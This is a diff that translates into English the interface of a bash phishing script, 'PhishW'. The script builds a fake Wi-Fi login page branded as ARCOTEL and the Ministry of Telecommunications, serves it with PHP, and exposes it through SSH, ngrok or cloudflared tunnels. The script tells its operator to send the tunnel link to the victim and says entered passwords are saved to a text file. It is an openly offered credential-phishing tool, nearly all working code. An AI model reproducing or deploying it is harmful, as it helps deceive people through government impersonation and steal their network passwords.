@@ -1,9 +1,9 @@
 #! /bin/bash
 
 #--->PHISHW
-#Code-actualizado
-#Codigo-libre
-#Dar-creditos-a-@Demo593
+#Code-updated
+#free-code
+#Give-credits-to-@Demo593
 
 clear
 setterm -foreground green
@@ -12,7 +12,7 @@ echo ""
 echo "=================Phishing================"
 echo ""
 setterm -foreground blue
-echo -n "[+]Introduce el nombre de la red wifi >> "
+echo -n "[+]Enter the name of the Wi-Fi network >> "
 read a
 echo "
 <!DOCTYPE html>
@@ -34,15 +34,15 @@ echo "
       <form action='login.php'  method='POST'>
         <div class='field input'>
           <label>Contraseña</label>
-          <input type='password' name='Clave' placeholder='introducir contraseña' required>
+          <input type='password' name='Clave' placeholder='enter password' required>
           <i class='fas fa-eye'></i>
         </div>
         <div class='SubmitBtn'>
-          <center><input class='submitBtn' type='submit'  value='Conectar'></center>
+          <center><input class='submitBtn' type='submit'  value='Connect'></center>
         </div>
       </form>
       <div class='link'>ARCOTEL S.A.<a href='login.php'</a></div>
-      <center><h8><FONT COLOR='gray'>Ministerio de Telecomunicaciones</FONT></h8></center>
+      <center><h8><FONT COLOR='gray'>Ministry of Telecommunications</FONT></h8></center>
     </section>
   </div>
 
@@ -52,7 +52,7 @@ echo "
 " > index.html
 
 sleep 1
-echo -n "[+]Escribe un puerto default.[4444] >> "
+echo -n "[+]Write a port default.[4444] >> "
 read b
 sleep 1
 echo ""
@@ -62,23 +62,23 @@ do
 #ESCOJER MENU
 setterm -foreground green
 echo "-----------------------------"
-echo "| [1]. Montar servidor php  |"
-echo "| [2]. Salir                |"
-echo -n "OPCION >> "
-read opcion
-case $opcion in
+echo "| [1]. Set up php server  |"
+echo "| [2]. Exit               |"
+echo -n "OPTION >> "
+read option
+case $option in
 1)
 #! /bin/bash
 setterm -foreground yellow
 echo ""
 echo "========================================="
-echo "La Contraseña se guarda en el archivo txt"
+echo "The Password is saved in the txt file"
 echo "========================================="
 while :
 do
 echo ""
 setterm -foreground white
-echo -e "\e[1;31ma\e[0m\e[1;34m)\e[0m\e[1;37mTunel SSH\e[0m     \e[1;31mb\e[0m\e[1;34m)\e[0m\e[1;37mNgrok automatico\e[0m    \e[1;31mc\e[0m\e[1;34m)\e[0m\e[1;37mCloudflared Tunnel\e[0m"
+echo -e "\e[1;31ma\e[0m\e[1;34m)\e[0m\e[1;37mTunnel SSH\e[0m     \e[1;31mb\e[0m\e[1;34m)\e[0m\e[1;37mAutomatic Ngrok\e[0m    \e[1;31mc\e[0m\e[1;34m)\e[0m\e[1;37mCloudflared Tunnel\e[0m"
 echo ""
 setterm -foreground blue
 echo -n "[+]PhishW >> "
@@ -89,7 +89,7 @@ a)
 echo ""
 setterm -foreground cyan
 echo "========================================="
-echo "Enviale el link del túnel a la victima"
+echo "Send the tunnel link to the victim"
 echo "========================================="
 echo ""
 php -S 0.0.0.0:$b & ssh -R 80:localhost:$b nokey@localhost.run -q -y
@@ -99,7 +99,7 @@ b)
 echo ""
 #! /bin/bash
 setterm -foreground yellow
-echo "[><] Cargando link Ngrok ...."
+echo "[><] Loading Ngrok link ...."
 sleep 3
 echo ""
 php -S 0.0.0.0:$b & ngrok http $b
@@ -109,7 +109,7 @@ c)
 echo ""
 #! /bin/bash
 setterm -foreground yellow
-echo "[><] Cargando Cloudflared ...."
+echo "[><] Charging Cloudflared ...."
 sleep 3
 echo ""
 setterm -foreground white
